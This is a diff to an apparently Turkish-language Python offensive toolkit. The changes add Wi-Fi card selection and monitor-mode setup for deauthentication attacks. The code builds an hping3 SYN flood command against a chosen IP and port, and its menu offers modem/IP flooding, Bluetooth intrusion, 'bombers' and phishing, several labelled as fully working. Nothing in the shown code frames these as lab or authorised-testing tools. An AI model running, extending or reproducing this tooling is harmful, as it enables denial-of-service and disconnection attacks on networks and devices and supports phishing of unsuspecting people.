@@ -13,6 +13,56 @@ import subprocess
 def clear():
     subprocess.run("clear", shell=True)
     
+def wifi_kartlarini_bul_ve_sec():
+    global monitor_mod_karti
+
+    try:
+        cikti = subprocess.check_output("iwconfig", shell=True).decode(errors="ignore")
+    except Exception:
+        sprint(Fore.RED + "[!] Wi-Fi kartları tespit edilemedi!" + Style.RESET_ALL)
+        time.sleep(2)
+        return None
+
+    kartlar = []
+
+    for satir in cikti.splitlines():
+        if "IEEE 802.11" in satir or satir.startswith("wlan"):
+            arayuz = satir.split()[0]
+            if arayuz not in kartlar:
+                kartlar.append(arayuz)
+
+    if not kartlar:
+        sprint(Fore.RED + "[!] Wi-Fi kartı bulunamadı!" + Style.RESET_ALL)
+        time.sleep(2)
+        return None
+
+    
+    if len(kartlar) == 1:
+        monitor_mod_karti = kartlar[0]
+        sprint(Fore.GREEN + f"[✓] Wi-Fi kartı otomatik seçildi: {monitor_mod_karti}" + Style.RESET_ALL)
+        time.sleep(2)
+        return monitor_mod_karti
+
+    
+    clear()
+    sprint(Fore.YELLOW + "[!] Birden fazla Wi-Fi kartı tespit edildi!" + Style.RESET_ALL)
+    print()
+
+    for i, kart in enumerate(kartlar, 1):
+        print(Fore.WHITE + f"{i}) {kart}" + Style.RESET_ALL)
+
+    while True:
+        secim = input(Fore.CYAN + "\nKullanılacak Wi-Fi kart numarasını seç: " + Style.RESET_ALL)
+        if not secim.isdigit():
+            continue
+
+        secim = int(secim)
+        if 1 <= secim <= len(kartlar):
+            monitor_mod_karti = kartlar[secim - 1]
+            sprint(Fore.GREEN + f"[✓] Seçilen Wi-Fi kartı: {monitor_mod_karti}" + Style.RESET_ALL)
+            time.sleep(2)
+            return monitor_mod_karti
+        
 def sprint(text, second=0.05):
     
     ansi_escape_pattern = re.compile(r'(\x1b\[[0-9;]*m)')
@@ -55,15 +105,6 @@ def wifi_kartlari_ve_monitor_modu_bul():
         return wifi_kartlari, monitor_mod_karti
     except Exception:
         return [], None
-
-wifi_kartlari, monitor_mod_karti = wifi_kartlari_ve_monitor_modu_bul()
-
-wifi_kartlari, monitor_mod_karti = wifi_kartlari_ve_monitor_modu_bul()
-clear()
-print(f"Bulunan WiFi kartları: {wifi_kartlari}")
-print(f"Monitor mod kartı: {monitor_mod_karti}")
-time.sleep(2)
-sprint(Fore.YELLOW + f"Flood, Deauth paketi saldırıları {monitor_mod_karti} arayüzü üzerinden yapılacaktır." + Style.RESET_ALL)
 
 def check_dependencies():
     requirements_file = "requirements.txt" 
@@ -110,7 +151,9 @@ def run_cmd(cmd):
         
 def monitor_mode_ac():
     global monitor_mod_karti
+
     clear()
+    sprint(Fore.CYAN + f"[!] Kilitlenen Wi-Fi kartı: {monitor_mod_karti}" + Style.RESET_ALL)
     sprint(Fore.YELLOW + "[*] Monitor moda geçiliyor..." + Style.RESET_ALL)
 
     run_cmd("airmon-ng check kill")
@@ -118,25 +161,13 @@ def monitor_mode_ac():
     run_cmd("rfkill unblock all")
     run_cmd("systemctl stop NetworkManager.service || true")
     run_cmd("systemctl stop wpa_supplicant.service || true")
-    time.sleep(2)
 
-    
     run_cmd(f"airmon-ng start {monitor_mod_karti}")
-
-    iw_out = subprocess.getoutput("iwconfig")
-    yeni_kart = None
-    for line in iw_out.splitlines():
-        if "Mode:Monitor" in line:
-            yeni_kart = line.split()[0]  
-            break
-
-    if yeni_kart:
-        monitor_mod_karti = yeni_kart
-        sprint(Fore.GREEN + f"[+] Monitor moda geçildi ({monitor_mod_karti})." + Style.RESET_ALL)
-    else:
-        sprint(Fore.RED + "[!] Monitor mod kartı bulunamadı!" + Style.RESET_ALL)
-
     time.sleep(2)
+
+    sprint(Fore.GREEN + f"[+] Monitor moda geçildi (Kilitli kart: {monitor_mod_karti})." + Style.RESET_ALL)
+    time.sleep(2)
+
 
 def aglari_tar(sure=30, monitor_mod_karti=None):
     if monitor_mod_karti is None:
@@ -301,9 +332,8 @@ def port_tarama(ip, portlar=[80, 443, 8080, 22, 23, 21, 53, 3389]):
 
 def flood_saldir(ip, port, paket_sayisi):
     sprint(Fore.YELLOW + f"[*] {ip}:{port} adresine flood saldırısı başlatılıyor. Paket sayısı: {paket_sayisi}" + Style.RESET_ALL)
-    # flood için hping3 kullanacağız
     if paket_sayisi == 0:
-        paket_sayisi = ""  # sınırsız
+        paket_sayisi = ""  
     else:
         paket_sayisi = f"-c {paket_sayisi}"
     cmd = f"hping3 {paket_sayisi} -S -p {port} --flood {ip}"
@@ -600,7 +630,7 @@ def ana_menu():
         print(Fore.CYAN + "║ " + Fore.YELLOW + "3) 🔍 OSINT Google Arama" + Fore.CYAN + "         ║     " + Fore.LIGHTRED_EX + "**Parrot" + Fore.BLUE + " OS:**")
         print(Fore.CYAN + "║ " + Fore.YELLOW + "4) 📶 WiFi Bağlanma(Mode Managed)" + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * Cihaza Deauth Saldırısı: Tamamen çalışır.")
         print(Fore.CYAN + "║ " + Fore.YELLOW + "5) 🕵️ Bluetooth Sızma" + Fore.CYAN + "             ║     " + Fore.LIGHTGREEN_EX + " * Modeme/IP Flood Saldırısı: Tamamen çalışır.")
-        print(Fore.CYAN + "║ " + Fore.YELLOW + "6) 💣 Bombalar                   " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * OSINT Google Arama: Tamamen çalışır.") # Yeni satır
+        print(Fore.CYAN + "║ " + Fore.YELLOW + "6) 💣 Bombalar                   " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * OSINT Google Arama: Tamamen çalışır.")
         print(Fore.CYAN + "║ " + Fore.YELLOW + "7) 📚 Phishing Saldırısı         " + Fore.CYAN + "║     " + Fore.LIGHTGREEN_EX + " * WiFi Bağlanma (Mode Managed): Tamamen çalışır.")
         print(Fore.CYAN + "║ " + Fore.LIGHTRED_EX + "8) ↩️ Çıkış                       " + Fore.CYAN + "║")
         print(Fore.CYAN + "╚══════════════════════════════════╝      ---")
@@ -694,5 +724,6 @@ def deauth_menu():
     deauth_saldir(secilen_ag['bssid'], hedefler, paket, monitor_mod_karti)
 
 if __name__ == "__main__":
-    check_dependencies() 
+    check_dependencies()
+    monitor_mod_karti = wifi_kartlarini_bul_ve_sec()
     ana_menu()
